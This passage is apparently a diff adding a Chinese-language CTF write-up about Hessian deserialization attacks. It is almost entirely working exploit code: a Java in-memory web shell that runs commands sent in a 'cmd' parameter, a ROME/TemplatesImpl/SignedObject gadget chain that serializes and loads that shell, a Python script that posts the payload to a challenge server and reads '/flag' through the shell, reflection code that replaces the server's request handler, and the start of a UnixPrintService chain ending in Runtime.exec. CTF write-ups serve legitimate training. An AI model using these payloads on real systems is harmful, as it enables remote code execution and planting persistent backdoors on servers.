+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream output <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span>var3<span style="color:#666">[</span>0<span style="color:#666">].</span><span style="color:#b44">equals</span><span style="color:#666">(</span><span style="color:#b44">&#34;cmd&#34;</span><span style="color:#666">)){</span>
+</span></span><span style="display:flex;"><span>            InputStream inputStream <span style="color:#666">=</span> Runtime<span style="color:#666">.</span><span style="color:#b44">getRuntime</span><span style="color:#666">().</span><span style="color:#b44">exec</span><span style="color:#666">(</span>var3<span style="color:#666">[</span>1<span style="color:#666">]).</span><span style="color:#b44">getInputStream</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            output <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ByteArrayOutputStream<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[]</span> buffer <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[</span>4096<span style="color:#666">];</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#0b0;font-weight:bold">int</span> n <span style="color:#666">=</span> 0<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">while</span> <span style="color:#666">(-</span>1 <span style="color:#666">!=</span> <span style="color:#666">(</span>n <span style="color:#666">=</span> inputStream<span style="color:#666">.</span><span style="color:#b44">read</span><span style="color:#666">(</span>buffer<span style="color:#666">)))</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                output<span style="color:#666">.</span><span style="color:#b44">write</span><span style="color:#666">(</span>buffer<span style="color:#666">,</span> 0<span style="color:#666">,</span> n<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>        response<span style="color:#666">+=(</span><span style="color:#b44">&#34;\n&#34;</span><span style="color:#666">+</span><span style="color:#a2f;font-weight:bold">new</span> String<span style="color:#666">(</span>output<span style="color:#666">.</span><span style="color:#b44">toByteArray</span><span style="color:#666">()));</span>
+</span></span><span style="display:flex;"><span>        t<span style="color:#666">.</span><span style="color:#b44">sendResponseHeaders</span><span style="color:#666">(</span>200<span style="color:#666">,</span> <span style="color:#666">(</span><span style="color:#0b0;font-weight:bold">long</span><span style="color:#666">)</span>response<span style="color:#666">.</span><span style="color:#b44">length</span><span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>        OutputStream os <span style="color:#666">=</span> t<span style="color:#666">.</span><span style="color:#b44">getResponseBody</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        os<span style="color:#666">.</span><span style="color:#b44">write</span><span style="color:#666">(</span>response<span style="color:#666">.</span><span style="color:#b44">getBytes</span><span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>        os<span style="color:#666">.</span><span style="color:#b44">close</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">transform</span><span style="color:#666">(</span>DOM document<span style="color:#666">,</span> SerializationHandler<span style="color:#666">[]</span> handlers<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> TransletException <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">transform</span><span style="color:#666">(</span>DOM document<span style="color:#666">,</span> DTMAxisIterator iterator<span style="color:#666">,</span> SerializationHandler handler<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> TransletException <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#666">}</span>
+</span></span></code></pre></div><p>之后生成payload</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">package</span> <span style="color:#00f;font-weight:bold">exp</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.caucho.hessian.io.Hessian2Input</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.caucho.hessian.io.Hessian2Output</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.rometools.rome.feed.impl.EqualsBean</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.rometools.rome.feed.impl.ObjectBean</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.rometools.rome.feed.impl.ToStringBean</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.*</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.lang.reflect.Field</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.nio.file.Files</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.nio.file.Paths</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.security.*</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.Base64</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.HashMap</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">javax.xml.transform.Templates</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">exp</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//为类的属性设置值
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">setValue</span><span style="color:#666">(</span>Object target<span style="color:#666">,</span> String name<span style="color:#666">,</span> Object value<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> Exception <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#666">=</span> target<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span>name<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#666">.</span><span style="color:#b44">set</span><span style="color:#666">(</span>target<span style="color:#666">,</span>value<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> HashMap <span style="color:#00a000">getObject</span><span style="color:#666">()</span> <span style="color:#a2f;font-weight:bold">throws</span> Exception <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> TemplatesImpl<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[]</span> bytecodes <span style="color:#666">=</span> Files<span style="color:#666">.</span><span style="color:#b44">readAllBytes</span><span style="color:#666">(</span>Paths<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;target/classes/memoryshell.class&#34;</span><span style="color:#666">));</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#666">(</span>templates<span style="color:#666">,</span><span style="color:#b44">&#34;_name&#34;</span><span style="color:#666">,</span> <span style="color:#b44">&#34;aaa&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#666">(</span>templates<span style="color:#666">,</span> <span style="color:#b44">&#34;_bytecodes&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">new</span> <span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[][]</span> <span style="color:#666">{</span>bytecodes<span style="color:#666">});</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#666">(</span>templates<span style="color:#666">,</span><span style="color:#b44">&#34;_tfactory&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">new</span> TransformerFactoryImpl<span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//构造ToStringBean
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        ToStringBean toStringBean<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>Templates<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span>templates<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean1<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>String<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span><span style="color:#b44">&#34;s&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//构造ObjectBean
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        ObjectBean objectBean<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ObjectBean<span style="color:#666">(</span>ToStringBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span>toStringBean1<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//构造HashMap
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        HashMap hashMap<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> HashMap<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        hashMap<span style="color:#666">.</span><span style="color:#b44">put</span><span style="color:#666">(</span>objectBean<span style="color:#666">,</span><span style="color:#b44">&#34;snakin&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//反射修改字段
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        Field obj<span style="color:#666">=</span>EqualsBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;obj&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Field equalsBean<span style="color:#666">=</span>ObjectBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;equalsBean&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obj<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        equalsBean<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obj<span style="color:#666">.</span><span style="color:#b44">set</span><span style="color:#666">(</span>equalsBean<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>objectBean<span style="color:#666">),</span>toStringBean<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span>  hashMap<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">main</span><span style="color:#666">(</span>String<span style="color:#666">[]</span> args<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> Exception <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        HashMap evilhashMap<span style="color:#666">=</span>getObject<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        KeyPairGenerator keyPairGenerator<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>        keyPairGenerator <span style="color:#666">=</span> KeyPairGenerator<span style="color:#666">.</span><span style="color:#b44">getInstance</span><span style="color:#666">(</span><span style="color:#b44">&#34;DSA&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        keyPairGenerator<span style="color:#666">.</span><span style="color:#b44">initialize</span><span style="color:#666">(</span>1024<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        KeyPair keyPair <span style="color:#666">=</span> keyPairGenerator<span style="color:#666">.</span><span style="color:#b44">genKeyPair</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        PrivateKey privateKey <span style="color:#666">=</span> keyPair<span style="color:#666">.</span><span style="color:#b44">getPrivate</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        Signature signingEngine <span style="color:#666">=</span> Signature<span style="color:#666">.</span><span style="color:#b44">getInstance</span><span style="color:#666">(</span><span style="color:#b44">&#34;DSA&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        SignedObject signedObject <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> SignedObject<span style="color:#666">(</span>evilhashMap<span style="color:#666">,</span>privateKey<span style="color:#666">,</span>signingEngine<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>SignedObject<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span>signedObject<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean1<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>String<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span><span style="color:#b44">&#34;s&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ObjectBean objectBean<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> ObjectBean<span style="color:#666">(</span>ToStringBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span>toStringBean1<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap hashMap<span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> HashMap<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        hashMap<span style="color:#666">.</span><span style="color:#b44">put</span><span style="color:#666">(</span>objectBean<span style="color:#666">,</span><span style="color:#b44">&#34;snakin&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Field obj<span style="color:#666">=</span> EqualsBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;obj&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Field equalsBean<span style="color:#666">=</span>ObjectBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;equalsBean&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obj<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        equalsBean<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obj<span style="color:#666">.</span><span style="color:#b44">set</span><span style="color:#666">(</span>equalsBean<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>objectBean<span style="color:#666">),</span>toStringBean<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Hessian2Output hessianOutput1 <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Hessian2Output<span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">new</span> FileOutputStream<span style="color:#666">(</span><span style="color:#b44">&#34;./hession.ser&#34;</span><span style="color:#666">));</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#666">.</span><span style="color:#b44">writeObject</span><span style="color:#666">(</span>hashMap<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#666">.</span><span style="color:#b44">close</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#666">}</span>
+</span></span></code></pre></div><p>使用python注入内存马获取flag</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">requests</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>url <span style="color:#666">=</span> <span style="color:#b44">&#34;http://fc468662-a072-4ff6-af4c-aa53ea6a8273.node4.buuoj.cn:81/?token=GeCTF2022&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">with</span> <span style="color:#a2f">open</span>(<span style="color:#b44">&#34;hession.ser&#34;</span>, <span style="color:#b44">&#34;rb&#34;</span>) <span style="color:#a2f;font-weight:bold">as</span> f:
+</span></span><span style="display:flex;"><span>    content <span style="color:#666">=</span> f<span style="color:#666">.</span>read()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>requests<span style="color:#666">.</span>post(url<span style="color:#666">=</span>url, data<span style="color:#666">=</span>content)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>url <span style="color:#666">=</span> <span style="color:#b44">&#34;http://fc468662-a072-4ff6-af4c-aa53ea6a8273.node4.buuoj.cn:81/shell?cmd=cat /flag&#34;</span>
+</span></span><span style="display:flex;"><span>text <span style="color:#666">=</span> requests<span style="color:#666">.</span>get(url)<span style="color:#666">.</span>text
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(text)
+</span></span></code></pre></div><p>当然我们也可以直接覆盖原来的handler</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">static</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">//获取当前线程
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        Object o <span style="color:#666">=</span> Thread<span style="color:#666">.</span><span style="color:#b44">currentThread</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">try</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            Field groupField <span style="color:#666">=</span> o<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;group&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            groupField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            Object group <span style="color:#666">=</span> groupField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>o<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            Field threadsField <span style="color:#666">=</span> group<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;threads&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            threadsField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            Object t <span style="color:#666">=</span> threadsField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>group<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            Thread<span style="color:#666">[]</span> threads <span style="color:#666">=</span> <span style="color:#666">(</span>Thread<span style="color:#666">[])</span> t<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">for</span> <span style="color:#666">(</span>Thread thread <span style="color:#666">:</span> threads<span style="color:#666">){</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">if</span><span style="color:#666">(</span>thread<span style="color:#666">.</span><span style="color:#b44">getName</span><span style="color:#666">().</span><span style="color:#b44">equals</span><span style="color:#666">(</span><span style="color:#b44">&#34;Thread-2&#34;</span><span style="color:#666">)){</span>
+</span></span><span style="display:flex;"><span>                    Field targetField <span style="color:#666">=</span> thread<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;target&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    targetField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    Object target <span style="color:#666">=</span> targetField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>thread<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    Field thisField <span style="color:#666">=</span> target<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;this$0&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    thisField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    Object <span style="color:#a2f;font-weight:bold">this</span>$0 <span style="color:#666">=</span> thisField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>target<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    Field contextsField <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">this</span>$0<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;contexts&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    contextsField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    Object contexts <span style="color:#666">=</span> contextsField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">this</span>$0<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    Field listField <span style="color:#666">=</span> contexts<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;list&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    listField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    Object lists <span style="color:#666">=</span> listField<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>contexts<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    java<span style="color:#666">.</span><span style="color:#b44">util</span><span style="color:#666">.</span><span style="color:#b44">LinkedList</span> linkedList <span style="color:#666">=</span> <span style="color:#666">(</span>java<span style="color:#666">.</span><span style="color:#b44">util</span><span style="color:#666">.</span><span style="color:#b44">LinkedList</span><span style="color:#666">)</span> lists<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    Object list <span style="color:#666">=</span> linkedList<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span>0<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    Field handlerField <span style="color:#666">=</span> list<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">().</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;handler&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    handlerField<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    handlerField<span style="color:#666">.</span><span style="color:#b44">set</span><span style="color:#666">(</span>list<span style="color:#666">,</span><span style="color:#a2f;font-weight:bold">new</span> InjectHandle<span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">catch</span> <span style="color:#666">(</span>Exception e<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#666">.</span><span style="color:#b44">printStackTrace</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span></code></pre></div><h2 id="a2-unixprintservice">A.2 UnixPrintService</h2>
+<p>利用链</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;sun.print.UnixPrintServiceLookup: javax.print.PrintService getDefaultPrintService()&gt;
+</span></span><span style="display:flex;"><span>&lt;sun.print.UnixPrintServiceLookup: java.lang.String getDefaultPrinterNameBSD()&gt;
+</span></span><span style="display:flex;"><span>&lt;sun.print.UnixPrintServiceLookup: java.lang.String[] execCmd(java.lang.String)&gt;
+</span></span><span style="display:flex;"><span>&lt;sun.print.UnixPrintServiceLookup$1: java.lang.Object run()&gt;
+</span></span><span style="display:flex;"><span>&lt;java.lang.Runtime: java.lang.Process exec(java.lang.String[])&gt;
+</span></span></code></pre></div><p>payload</p>
